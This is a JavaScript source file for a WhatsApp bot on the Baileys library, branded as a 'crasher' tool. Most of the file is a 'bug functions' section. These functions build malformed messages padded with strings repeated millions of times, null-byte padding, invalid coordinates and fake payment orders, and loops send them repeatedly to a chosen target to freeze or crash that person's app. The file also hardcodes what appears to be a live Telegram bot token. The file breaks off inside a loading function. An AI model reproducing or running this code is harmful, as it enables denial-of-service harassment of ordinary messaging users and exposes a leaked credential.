const { default: makeWASocket, fetchLatestBaileysVersion, downloadContentFromMessage, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs') 
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const pino = require('pino')
const readline = require("readline");
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc")
const NodeCache = require('node-cache');

const { MsbreewcXdelta2 } = require('./JapaneseGuys/MsbreewcXzexxo2')
const wkwk = fs.readFileSync(`./JapaneseGuys/x.mp3`)
const xsteek = fs.readFileSync(`./JapaneseGuys/x.webp`)
const o = fs.readFileSync(`./JapaneseGuys/o.jpg`)

//database
let premium = JSON.parse(fs.readFileSync('./database/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let _afk = JSON.parse(fs.readFileSync('./database/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))

//autorep
const VoiceNotefuckdel = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'))
const Stickerfuckdel = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'))
const Imagefuckdel = JSON.parse(fs.readFileSync('./database/autoreply/image.json'))
const Videofuckdel = JSON.parse(fs.readFileSync('./database/autoreply/video.json'))
const Docfuckdel = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'))
const Zipfuckdel = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
const Apkfuckdel = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'))

const aikamemek = ''.repeat(99999999);
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `𝐀𝐋𝐖𝐀𝐘𝐒 𝐙𝐄𝐗𝐗ᯩᯩᯨᯨᯨᰲ𝐎ᯭᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴╮.╮⭑⃰͜͡؜𝐀𝐋𝐖𝐀𝐘𝐒 𝐙𝐄𝐗𝐗ᯩᯩᯨᯨᯨᰲ𝐎ᯭᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴ C̸R꙰̸A꙰̸S꙰̸H꙰😹⃟╮.xp`+"𝖒𝖆𝖒𝖕𝖚𝖘 𝖐𝖊𝖓𝖆 𝖚𝖎 𝖘𝖞𝖘𝖙𝖊𝖒😹𝐏⃭⃭⃑⃑⃰⃰⃰⃕⃔𝐧⃭⃭⃭⃑⃑𝐙⃭⃭⃭⃑⃑⃰⃰⃐⃑⃕ꦾꦀꦀꦀꦀꦀꦀꦁꦁꦀꦀꦁꦁꦀꦁꦁꦀꦀꦁꦀꦀꦁꦀꦀꦁꦀꦀꦁꦀꦀꦁꦀꦀꦁꦁꦀꦀꦀ".repeat(9999999),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await deltacrashgcinc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

//time
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var fuckdelytimewisher = `Good Night`
 }
 if(time2 < "19:00:00"){
var fuckdelytimewisher = `Good Evening`
 }
 if(time2 < "18:00:00"){
var fuckdelytimewisher = `Good Evening`
 }
 if(time2 < "15:00:00"){
var fuckdelytimewisher = `Good Afternoon`
 }
 if(time2 < "11:00:00"){
var fuckdelytimewisher = `Good Morning`
 }
 if(time2 < "05:00:00"){
var fuckdelytimewisher = `Good Morning`
 } 
module.exports = deltacrashgcinc = async (deltacrashgcinc, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectdeltacrashrevolutionReply.selectedRowId : (m.mtype == 'templateButtonzexxocrashrevolutionReplyMessage') ? m.message.templateButtondeltacrashrevolutionReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectdeltacrashrevolutionReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await deltacrashgcinc.decodeJid(deltacrashgcinc.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await deltacrashgcinc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const isCreator = [ownernumber, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        const clientId = deltacrashgcinc.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? deltacrashgcinc.user.id.split(':')[0] + "@s.whatsapp.net" || deltacrashgcinc.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);
        expiredCheck(deltacrashgcinc, m, premium);
//group chat msg by fuckdel


let ppuser
try {
ppuser = 'https://i.top4top.io/p_3268nuhjg0.jpg'
} catch (err) {
ppuser = 'https://i.top4top.io/p_3268nuhjg0.jpg'
}


async function deltacrashrevolutionReply(teks) {
return deltacrashgcinc.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnailUrl: ppuser, title: "©𝐉𝐞𝐗𝐱𝐨 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐖𝐚𝐧𝐠𝐜𝐚𝐩 - MargaNezuroVvip", body: "𝐉𝐞𝐗𝐱𝐨🥵", previewType: "PHOTO"}}}, {quoted: m})
}


async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return deltacrashrevolutionReply('Enther your url telegram sticker link')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const fuckdelyresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'zexxodev',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            fuckdelyresult.push(result)
        }
    resolve(fuckdelyresult)
    })
}

//bug functions







const fsaluran = { key : {
remoteJid: '0@s.whatsapp.net',
participant : '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '120363312773734994@newsletter',
    newsletterName: '',
    caption: body
}}}






const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./JapaneseGuys/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"𝐀𝐋𝐖𝐀𝐘𝐒 𝐙𝐄𝐗𝐗ᯩᯩᯨᯨᯨᰲ𝐎ᯭᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./JapaneseGuys/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"𝐀𝐋𝐖𝐀𝐘𝐒 𝐙𝐄𝐗𝐗ᯩᯩᯨᯨᯨᰲ𝐎ᯭᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴╮⭑ ☠️⃰͜͡؜𝐀𝐋𝐖𝐀𝐘𝐒 𝐙𝐄𝐗𝐗ᯩᯩᯨᯨᯨᰲ𝐎ᯭᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const oneclickfuckdel = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `ÐÈL†ÄVÌRÚ§`
}
}
}
async function blackening(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await deltacrashgcinc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function locationfuckdely(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `𝐀𝐋𝐖𝐀𝐘𝐒 𝐙𝐄𝐗𝐗ᯩᯩᯨᯨᯨᰲ𝐎ᯭᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴`+"ᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴".repeat(60000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await deltacrashgcinc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function fuckdelkillpic(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "ÐÈL†ÄVÌRÚ§",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/Wppj16p/cheemspic.jpg" } }, { upload: deltacrashgcinc.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #𝐀𝐋𝐖𝐀𝐘𝐒 𝐙𝐄𝐗𝐗ᯩᯩᯨᯨᯨᰲ𝐎ᯭᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await deltacrashgcinc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function aipong(target) {
await deltacrashgcinc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}

async function listfuckdelfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "ÐÈL†ÄVÌRÚ§"+" ".repeat(920000),
        'footerText': `ÐÈL†ÄVÌRÚ§`,
        'description': `ÐÈL†ÄVÌRÚ§ÐÈL†ÄVÌRÚ§`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: oneclickfuckdel });
await deltacrashgcinc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}


const sendReaction = async reactionContent => {
  deltacrashgcinc.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

async function sendRepeatedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
   deltacrashgcinc.sendMessage(recipientJid, {
      'text': ''.repeat(50000)
    }, {
      'participant': {
        'jid': jid
      },
      'messageId': etc.key.id
    }, {
      'quoted': m
    });
  }
}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    deltacrashgcinc.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "𝖒𝖆𝖒𝖕𝖚𝖘 𝖐𝖊𝖓𝖆 𝖚𝖎 𝖘𝖞𝖘𝖙𝖊𝖒😹"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : '𝖒𝖆𝖒𝖕𝖚𝖘 𝖐𝖊𝖓𝖆 𝖚𝖎 𝖘𝖞𝖘𝖙𝖊𝖒😹', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await deltacrashgcinc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "𝖒𝖆𝖒𝖕𝖚𝖘 𝖐𝖊𝖓𝖆 𝖚𝖎 𝖘𝖞𝖘𝖙𝖊𝖒😹" + "\0".repeat(920000),
      'footerText': "𝐀𝐋𝐖𝐀𝐘𝐒 𝐙𝐄𝐗𝐗ᯩᯩᯨᯨᯨᰲ𝐎ᯭᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴ׁׅ֒⃟╮",
      'description': "𝐀𝐋𝐖𝐀𝐘𝐒 𝐙𝐄𝐗𝐗ᯩᯩᯨᯨᯨᰲ𝐎ᯭᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴ׁׅ֒⃟╮",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await deltacrashgcinc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': '𝐙𝐞𝐗𝐱𝐨 𝐃𝐄𝐕' + '꧀ꦾꦿꦾꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦸꦸꦸꦸꦹꦸꦹꦸꦹꦸꦹꦸꦹꦸꦹꦸꦹꦵꦿꦾꦾ꧀ꦾꦿꦾꦹꦹꦹꦹꦹꦹꦹ'.repeat(80000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await deltacrashgcinc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  deltacrashgcinc.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': "𝐀𝐋𝐖𝐀𝐘𝐒 𝐙𝐄𝐗𝐗ᯩᯩᯨᯨᯨᰲ𝐎ᯭᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴ᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴ᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴ᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴ᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴ᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴ᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴ᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴ᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴" + 'ꦾ'.repeat(80000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}
async function sendPaymentInvite(jid) {
  deltacrashgcinc.relayMessage(jid, {
    'paymentInviteMessage': {
      'serviceType': "UPI",
      'expiryTimestamp': Date.now() + 86400000
    }
  }, {
    'participant': {
      'jid': jid
    }
  });
}

async function sendMultiplePaymentInvites(jid, count) {
  for (let i = 0; i < count; i++) {
    sendPaymentInvite(jid);
    sendExtendedTextMessage(jid);
    await sleep(500);
  }
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    sendLiveLocationMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return deltacrashgcinc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return deltacrashgcinc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: botname
}
}
}

const fakeflow = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
'message': {
"interactiveMessage": {
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": bimg
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"${botname}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"${ownername}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
}
]
}
}
}
};

const fuckdelimun = (texto) => {
deltacrashgcinc.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return reply("Erro..")
})
}

const subscribe_dgfuckdel = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `𝐀𝐋𝐖𝐀𝐘𝐒 𝐙𝐄𝐗𝐗ᯩᯩᯨᯨᯨᰲ𝐎ᯭᬄᬃᮩᮡᮡᮡᮢᮢᮢᮢᮢᯭᬊ᜴ׁׅ֒`
}}
}
async function fuckdelyCrashy(dgfuckdel,chat) {
deltacrashgcinc.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${dgfuckdel}.${MsbreewcXdelta2}` ,
caption: `${dgfuckdel + MsbreewcXdelta2}`,
}, {quoted: subscribe_dgfuckdel })
}
//end bug functions

async function loading () {
var fuckdellod = [
"《 Z 》10%",
"《 E 》30%",
"《 X 》50%",
"《 X 》80%",
"《 O 》100%",
"𝐀𝐋𝐖𝐀𝐘𝐒 𝐙𝐄𝐗𝐗𝐎🐦...."
]
let { key } = await deltacrashgcinc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < fuckdellod.length; i++) {
